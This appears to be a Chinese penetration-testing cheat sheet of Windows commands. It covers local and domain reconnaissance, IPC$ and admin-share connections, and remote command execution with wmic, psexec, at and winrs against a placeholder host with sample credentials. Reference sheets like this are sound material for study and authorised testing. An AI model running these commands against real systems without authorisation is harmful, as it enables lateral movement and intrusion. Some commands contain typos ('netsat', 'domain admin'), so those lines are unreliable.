# 渗透测试—— Windows 系统常用命令

## 0x01 信息收集
### 1.1 本机信息
 - 查看系统信息 ： `systeminfo`
 - 查看进程 ： `tasklist`
 - 查看当前工作目录  : `chdir` 
 - 查看网络会话 ： `netsat -ano`
 - 查看用户： `net user`
 - 查看管理员：`net localgroup administrators `
 - 查看abc用户信息：`net user abc`
 - 查看文件共享：`net use`
 - 查看远程桌面连接历史： `cmdkey /l`
 - 查看杀毒软件 ： `wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe`
 - 查询登录用户：`query user`
### 1.2 域信息
> 有时候本地用户无法查到相关信息，可以通过runas切换到域用户进行查询。      

- 查看域：`net view /domain`
- 查看abc域中的主机：`net view /domain:abc` 
- 查看域用户 ：`net user /domain`
- 查看域管理员 ： `net group "domain admin" /domain`
- 查看本机域管理员 ：`net localgroup administrators /domain `
- 查看域控主机 ：`dsquery server`  or `net group “domain controllers” /domain`
## 0x02 远程文件操作
### net use
前置条件：目标主机开启IPC$共享（端口：445）      
目标主机：192.168.0.1 用户名：abc 密码：password
- 建立空连接: `net use \\192.168.0.1\ipc$ "" /user:"" `
- 建立非空连接: `net use \\192.168.0.1\ipc$ "password" /user:"abc" `
 - 映射默认共享: `net use z: \\192.168.0.1\c$ "password" /user:"abc"`
 - 删除一个ipc$连接： `net use \\192.168.0.1\ipc$ /del`
- 删除映射的z盘: `net use z: /del `

### net share
本机开启共享：   
```
net share c$=c:
net share d$=d:
net share ipc$
net share admin$
```

### 文件操作
- 压缩文件（默认导出压缩文件最后一个字符改为`_`）： `makecab  file`
- 解压文件： `expand src tar.zip`

## 0x03 远程命令执行
### wmic
前置条件：目标开启 "Windows Management Instrumentation" 服务（端口：135）   
目标主机：192.168.0.1 用户名：abc 密码：password   
- 执行命令 ： `wmic /node:192.168.0.1 /user:abc /password:password PROCESS call create "cmd /c ver > c:\\test.txt"`

### psexec

前置条件：目标开启 ADMIN$ 共享（端口：445）   
工具：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools   
目标主机：192.168.0.1 用户名：abc 密码：password   
- 执行命令(交互式shell) ： `psexec \\192.168.0.1 -u abc -p password cmd`

### at
前置条件：目标启动 Task Scheduler 服务    
目标主机：192.168.0.1 用户名：abc 密码：password  

- 添加计划任务在远程系统上执行命令: `at \\192.168.0.1 23:00 cmd.exe /c "ver > c:\test.txt"`
- 查看 at 任务列表: `at \\192.168.0.1`
- 删除 at 计划任务: `at \\192.168.17.138 1 /delete`

### winrm
前置条件：目标启动winrm服务（5985,5986端口）
目标启动快速启动winrm服务：
```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
```
目标主机：192.168.0.1 用户名：abc 密码：password  
执行命令： `winrs -r:http://192.168.0.1:5985 -u:abc -p:password  "whoami /all"`


## 0x04 权限切换

- 通过abc用户权限启动cmd：
`runas /user:abc cmd`


## ref
- https://chen1sheng.github.io/2020/11/30/%E6%B8%97%E9%80%8F/windows/Windows%E5%9F%9F%E6%B8%97%E9%80%8F%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/
- https://www.cnblogs.com/LyShark/p/11344288.html
- https://cloud.tencent.com/developer/article/1180419
